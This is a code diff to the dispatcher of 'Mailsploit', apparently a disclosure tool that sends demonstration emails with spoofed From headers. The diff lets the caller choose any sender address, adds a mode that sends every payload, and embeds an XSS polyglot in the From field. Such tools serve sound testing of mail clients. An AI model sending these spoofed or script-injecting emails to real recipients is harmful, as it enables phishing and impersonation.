@@ -3,9 +3,11 @@
  * Copyright (C) 2018 Sabri Haddouche
  */
 
+import * as util from 'util';
+import * as escape from 'escape-html';
 import * as nodeMailer from 'nodemailer';
 import * as SMTPTransport from 'nodemailer/lib/smtp-transport';
-import {PayloadDirectory} from './Payloads';
+import {PayloadDirectory, PayloadDirectoryCount} from './Payloads';
 import {Config} from './Config';
 
 export class Dispatcher {
@@ -32,40 +34,27 @@ export class Dispatcher {
     });
   }
 
-  private _dispatch(options: nodeMailer.SendMailOptions): void {
+  private _internalDispatcher(options: nodeMailer.SendMailOptions): void {
     console.log('Dispatching email...');
     this.transporter.sendMail(options, (error, info) => {
       if (error) {
         return console.log(JSON.stringify(error));
       }
-      console.log('Email has been dispatched');
-      return console.log(JSON.stringify(info));
+      //console.log('Email has been dispatched');
+      //return console.log(JSON.stringify(info));
     });
   }
 
-  public async dispatch(email: string, options: Array<number>, xss: string): Promise<void> {
-    console.log(`Dispatching a demo to %s with options: %o`, email, options);
-
-    // Check email
-    if (!Dispatcher.isEmail(email)) {
-      throw new Error('Provided email is invalid.');
-    }
-
-    // Dispatch email(s)
+  private _dispatch(receiver: string, sender: string, options: Array<number>, ci: boolean) {
     for (const option of options) {
-      if (typeof option !== 'string' || typeof PayloadDirectory[option] === 'undefined') {
-        console.log('Non-existant payload detected.');
-        continue;
-      }
-
       // Polyglot asked?
-      if (typeof xss === 'string' && xss === 'true' && PayloadDirectory[option].generic !== true) {
+      if (ci && PayloadDirectory[option].generic !== true) {
         const payload = PayloadDirectory[option].build(
-          `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`,
+          `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=prompt(1)//>\\x3e`,
         );
-        console.log(payload.length);
+        //console.log(payload.length);
         if (payload.length <= 320) {
-          this._dispatch({
+          this._internalDispatcher({
             from: payload,
             html: Config.Dispatcher.htmlBodyXSS,
             subject: `Mailsploit: ${PayloadDirectory[option].name}${
@@ -74,26 +63,60 @@ export class Dispatcher {
                 : ' (XSS polyglot)'
             }`,
             text: Config.Dispatcher.plaintextBodyXSS,
-            to: email,
+            to: receiver,
           });
         } else {
-          console.log(`Did not sent XSS for option ${option} because the payload is more than 320 bytes.`);
+          //console.log(`Did not sent XSS for option ${option} because the payload is more than 320 bytes.`);
         }
       }
-      this._dispatch({
-        from: PayloadDirectory[option].build(Config.Dispatcher.from),
-        replyTo: Config.Dispatcher.from,
-        html: !PayloadDirectory[option].generic ? Config.Dispatcher.htmlBody : Config.Dispatcher.htmlBodyGeneric,
+
+      const escapedSender = escape(sender);
+
+      this._internalDispatcher({
+        from: PayloadDirectory[option].build(sender),
+        replyTo: sender,
+        html: util.format(
+          !PayloadDirectory[option].generic ? Config.Dispatcher.htmlBody : Config.Dispatcher.htmlBodyGeneric,
+          escapedSender,
+        ),
         subject: `Mailsploit: ${PayloadDirectory[option].name}${
           typeof PayloadDirectory[option].representation === 'string' && !PayloadDirectory[option].generic
             ? ` (via ${PayloadDirectory[option].representation})`
             : ''
         }`,
-        text: !PayloadDirectory[option].generic
-          ? Config.Dispatcher.plaintextBody
-          : Config.Dispatcher.plaintextBodyGeneric,
-        to: email,
+        text: util.format(
+          !PayloadDirectory[option].generic ? Config.Dispatcher.plaintextBody : Config.Dispatcher.plaintextBodyGeneric,
+          escapedSender,
+        ),
+        to: receiver,
       });
+    }
+  }
+
+  public async dispatch(receiver: string, sender: string, option: number, ci: string): Promise<void> {
+    console.log(`Dispatching a demo to %s as %s with option %o`, receiver, sender, option);
+
+    // Check email
+    if (!Dispatcher.isEmail(receiver) || !Dispatcher.isEmail(sender)) {
+      throw new Error('Provided email is invalid.');
+    }
+
+    // Check number
+    if (typeof option !== 'string' || (typeof PayloadDirectory[parseInt(option)] === 'undefined' && option !== '-1')) {
+      throw new Error('Non-existant payload detected.');
+    }
+
+    const wantCI = typeof ci === 'string' && ci === 'true' ? true : false;
+
+    if (option === '-1') {
+      this._dispatch(
+        receiver,
+        sender,
+        Array.apply(null, {length: PayloadDirectoryCount}).map(Number.call, Number),
+        wantCI,
+      );
+    } else {
+      this._dispatch(receiver, sender, [parseInt(option)], wantCI);
     }
   }
 }
